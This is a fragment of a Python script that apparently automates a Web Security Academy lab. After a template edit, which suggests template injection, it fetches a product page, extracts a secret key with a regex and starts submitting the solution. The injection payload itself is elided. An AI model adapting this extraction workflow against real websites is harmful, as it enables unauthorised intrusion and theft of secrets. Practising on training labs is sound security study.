...
LAB_URL = "https://0a2c00b5033526f285bf148900ed00f5.web-security-academy.net"
...
def main():
    ...
    product_page = fetch("/product?productId=1") # productId should be the same as the one used in editing template

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Extracting the secret key.. ", end="", flush=True)

    secret_key = re.findall("</label>\s*(\w*)\s*", product_page.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)
    print(Fore.WHITE + "⦗9⦘ Submitting the solution.. ", end="", flush=True)
